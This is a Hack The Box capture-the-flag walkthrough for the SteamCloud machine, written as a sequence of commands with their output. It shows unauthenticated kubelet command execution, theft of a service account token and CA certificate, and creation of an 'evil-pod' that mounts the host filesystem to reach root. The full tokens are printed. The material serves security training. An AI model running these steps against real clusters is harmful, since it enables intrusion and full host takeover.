## HTB - SteamCloud
## LINUX - Easy
## 10.10.11.133
-----------------------------------------------------------------------------------------
### ENUM
#### NMAP
```bash
sudo nmap -v -p- --min-rate 5000 10.10.11.133
```
PORT      STATE SERVICE
22/tcp    open  ssh
2379/tcp  open  etcd-client
2380/tcp  open  etcd-server
8443/tcp  open  minikube API
10249/tcp open  unknown
10250/tcp open  Kubelet API
10256/tcp open  unknown

#### KUBELETCTL
```bash
/opt/kubeletctl/kubeletctl_linux_amd64 -s 10.10.11.133 pods
```
┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ coredns-78fcd69978-2f442           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 4 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 5 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 6 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 7 │ storage-provisioner                │ kube-system │ storage-provisioner     │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 8 │ kube-proxy-hlck8                   │ kube-system │ kube-proxy              │
│   │                                    │             │                         │
└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘

```bash
/opt/kubeletctl/kubeletctl_linux_amd64 -s 10.10.11.133 scan rce
```
┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                  │
├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │              │                                    │             │                         │ RUN │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.10.11.133 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │              │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 3 │              │ storage-provisioner                │ kube-system │ storage-provisioner     │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 4 │              │ kube-proxy-hlck8                   │ kube-system │ kube-proxy              │ +   │ <==
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 5 │              │ coredns-78fcd69978-2f442           │ kube-system │ coredns                 │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 6 │              │ nginx                              │ default     │ nginx                   │ +   │ <==
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 7 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 8 │              │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │ -   │
└───┴──────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘


-----------------------------------------------------------------------------------------
### ACTIONS
#### KUBELETCTL
**Try to run a command on the pods ngnix. We have RCE in this pod**
```bash
/opt/kubeletctl/kubeletctl_linux_amd64 -s 10.10.11.133 exec "ls -la /root/" -p "nginx" -c "nginx"
```
-rw-r--r-- 2 root root   33 Mar 18 10:25 user.txt

**Try to have a reverse shell**
```bash
/opt/kubeletctl/kubeletctl_linux_amd64 -s 10.10.11.133 exec "rev_shell" -p "nginx" -c "nginx"
```
NO RESULT

**Try to get a token**
```bash
/opt/kubeletctl/kubeletctl_linux_amd64 -s 10.10.11.133 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p "nginx" -c "nginx"
```
eyJhbGciOiJSUzI1NiIsImtpZCI6IkdrYUxwOFp6ZEJGdTNVdHg0SFhzM0l6anBWVjExVl9MVlBuRDJEUkdrM00ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzQyMjkzNTYyLCJpYXQiOjE3MTA3NTc1NjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjQ4N2M2MTg4LTJlYzgtNDQ2Ni1hNTliLWZiNjIwODE0NzhlYiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjRlZjFmOGRlLTYwZDAtNDQwYy05ZWJlLWNlYWYxODg2ZmU5ZCJ9LCJ3YXJuYWZ0ZXIiOjE3MTA3NjExNjl9LCJuYmYiOjE3MTA3NTc1NjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.NfasPcduMxlksH9EDX_vQEjHvTd5Y17yrUCjsPt_Qz_HLCrSNdi6C2LtOEIm4YZwOqXzfbSZ__b4Ecwp4X-STz73kIUu3g4dti0gHvKCu6cjM0Bxy9YNcby8_TRl7VdBuWZAtBKTIjvc0RvdRK3Ed7fwnoJqbqK_D_4k6x0tO9y8TTIFsopuAmGef3eoahAhkgKF075BmHc_TDUoKg8RT-2hg0mFLW0oD1vQQiH2MsjDYagngc93_p7duMN-TNLuQNeZRaR1PO43xjhQ_jA9qf3kX1JCP-Hsccx8bwLwiFXOvb-e4QRrwM4ZgvvS32_V4CDZbCDy3IeIHuf6ZRf2Tg

or

eyJhbGciOiJSUzI1NiIsImtpZCI6IkdrYUxwOFp6ZEJGdTNVdHg0SFhzM0l6anBWVjExVl9MVlBuRDJEUkdrM00ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzQyMjk2NDk5LCJpYXQiOjE3MTA3NjA0OTksImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjQ4N2M2MTg4LTJlYzgtNDQ2Ni1hNTliLWZiNjIwODE0NzhlYiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjRlZjFmOGRlLTYwZDAtNDQwYy05ZWJlLWNlYWYxODg2ZmU5ZCJ9LCJ3YXJuYWZ0ZXIiOjE3MTA3NjQxMDZ9LCJuYmYiOjE3MTA3NjA0OTksInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.abuPzs13RrdJJKdznJi_bFGVpQJVrLc4wjqBLUn3REH7Rs-PZa2VPh5DcWc6sEhhOpyZLmcHV0x6VJ8aYIZ81XLy5iMkQULrmYCifVOnUIx4h3XiE-otQUbNRyjbMmKhHXDXiNOOpNe84h19HEBQZt7Ycriif4YvZ8WirwFgudP6VHkXA2O89rIxMAw0fG-A_kMfzBAQkH4To48sGqIR_CgY7WMGL_PdyX-ygQ1SqDpc12QHdjl2PDUdH3SxxYjFXkKkXQ4zmUyMMQJTcSGJ88z4Mcx7RuQzysIdJDJSfaw3SQWu3gr8XSy-tTiRn3wcST7FMuis8EWx-iz-bJ8Tlw

**Get the ca.crt**
```bash
/opt/kubeletctl/kubeletctl_linux_amd64 -s 10.10.11.133 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p "nginx" -c "nginx"
```
-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
a3ViZUNBMB4XDTIxMTEyOTEyMTY1NVoXDTMxMTEyODEyMTY1NVowFTETMBEGA1UE
AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOoa
YRSqoSUfHaMBK44xXLLuFXNELhJrC/9O0R2Gpt8DuBNIW5ve+mgNxbOLTofhgQ0M
HLPTTxnfZ5VaavDH2GHiFrtfUWD/g7HA8aXn7cOCNxdf1k7M0X0QjPRB3Ug2cID7
deqATtnjZaXTk0VUyUp5Tq3vmwhVkPXDtROc7QaTR/AUeR1oxO9+mPo3ry6S2xqG
VeeRhpK6Ma3FpJB3oN0Kz5e6areAOpBP5cVFd68/Np3aecCLrxf2Qdz/d9Bpisll
hnRBjBwFDdzQVeIJRKhSAhczDbKP64bNi2K1ZU95k5YkodSgXyZmmkfgYORyg99o
1pRrbLrfNk6DE5S9VSUCAwEAAaNhMF8wDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQW
MBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQW
BBSpRKCEKbVtRsYEGRwyaVeonBdMCjANBgkqhkiG9w0BAQsFAAOCAQEA0jqg5pUm
lt1jIeLkYT1E6C5xykW0X8mOWzmok17rSMA2GYISqdbRcw72aocvdGJ2Z78X/HyO
DGSCkKaFqJ9+tvt1tRCZZS3hiI+sp4Tru5FttsGy1bV5sa+w/+2mJJzTjBElMJ/+
9mGEdIpuHqZ15HHYeZ83SQWcj0H0lZGpSriHbfxAIlgRvtYBfnciP6Wgcy+YuU/D
xpCJgRAw0IUgK74EdYNZAkrWuSOA0Ua8KiKuhklyZv38Jib3FvAo4JrBXlSjW/R0
JWSyodQkEF60Xh7yd2lRFhtyE8J+h1HeTz4FpDJ7MuvfXfoXxSDQOYNQu09iFiMz
kf2eZIBNMp0TFg==
-----END CERTIFICATE-----

#### KUBECTL
**Get available/allowed rights**
```bash
kubectl auth can-i --list --server https://10.10.11.133:8443 --certificate-authority=~/nextcloud_priv/Documents/htb/steamcloud/ca.crt --token='eyJhbGciOiJSUzI1NiIsImtpZCI6IkdrYUxwOFp6ZEJGdTNVdHg0SFhzM0l6anBWVjExVl9MVlBuRDJEUkdrM00ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzQyMjk2NDk5LCJpYXQiOjE3MTA3NjA0OTksImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjQ4N2M2MTg4LTJlYzgtNDQ2Ni1hNTliLWZiNjIwODE0NzhlYiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjRlZjFmOGRlLTYwZDAtNDQwYy05ZWJlLWNlYWYxODg2ZmU5ZCJ9LCJ3YXJuYWZ0ZXIiOjE3MTA3NjQxMDZ9LCJuYmYiOjE3MTA3NjA0OTksInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.abuPzs13RrdJJKdznJi_bFGVpQJVrLc4wjqBLUn3REH7Rs-PZa2VPh5DcWc6sEhhOpyZLmcHV0x6VJ8aYIZ81XLy5iMkQULrmYCifVOnUIx4h3XiE-otQUbNRyjbMmKhHXDXiNOOpNe84h19HEBQZt7Ycriif4YvZ8WirwFgudP6VHkXA2O89rIxMAw0fG-A_kMfzBAQkH4To48sGqIR_CgY7WMGL_PdyX-ygQ1SqDpc12QHdjl2PDUdH3SxxYjFXkKkXQ4zmUyMMQJTcSGJ88z4Mcx7RuQzysIdJDJSfaw3SQWu3gr8XSy-tTiRn3wcST7FMuis8EWx-iz-bJ8Tlw'
```
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
pods                                            []                                    []               [get create list] <== **create allowed**
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]


**Creation of an evil pod**
1. yaml file for the container
```yaml
apiVersion: v1 
kind: Pod
metadata:
  name: evil-pod
  namespace: default
spec:
  containers:
  - name: evil-pod
    image: nginx:1.14.2
    volumeMounts: 
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:  
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```
2. Creation of the evil pod 
```bash
kubectl apply -f ~/nextcloud_priv/Documents/htb/steamcloud/evil_container.yaml --server https://10.10.11.133:8443 --certificate-authority=~/nextcloud_priv/Documents/htb/steamcloud/ca.crt --token='eyJhbGciOiJSUzI1NiIsImtpZCI6IkdrYUxwOFp6ZEJGdTNVdHg0SFhzM0l6anBWVjExVl9MVlBuRDJEUkdrM00ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzQyMjk2NDk5LCJpYXQiOjE3MTA3NjA0OTksImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjQ4N2M2MTg4LTJlYzgtNDQ2Ni1hNTliLWZiNjIwODE0NzhlYiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjRlZjFmOGRlLTYwZDAtNDQwYy05ZWJlLWNlYWYxODg2ZmU5ZCJ9LCJ3YXJuYWZ0ZXIiOjE3MTA3NjQxMDZ9LCJuYmYiOjE3MTA3NjA0OTksInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.abuPzs13RrdJJKdznJi_bFGVpQJVrLc4wjqBLUn3REH7Rs-PZa2VPh5DcWc6sEhhOpyZLmcHV0x6VJ8aYIZ81XLy5iMkQULrmYCifVOnUIx4h3XiE-otQUbNRyjbMmKhHXDXiNOOpNe84h19HEBQZt7Ycriif4YvZ8WirwFgudP6VHkXA2O89rIxMAw0fG-A_kMfzBAQkH4To48sGqIR_CgY7WMGL_PdyX-ygQ1SqDpc12QHdjl2PDUdH3SxxYjFXkKkXQ4zmUyMMQJTcSGJ88z4Mcx7RuQzysIdJDJSfaw3SQWu3gr8XSy-tTiRn3wcST7FMuis8EWx-iz-bJ8Tlw'
```
pod/evil-pod created

#### KUBELETCTL
**Connect to the new pod**
```bash
/opt/kubeletctl/kubeletctl_linux_amd64 -s 10.10.11.133 exec "/bin/bash" -p "evil-pod" -c "evil-pod"
```
Get a shell

**get root flag**
```bash
cat /mnt/root/root.txt
```
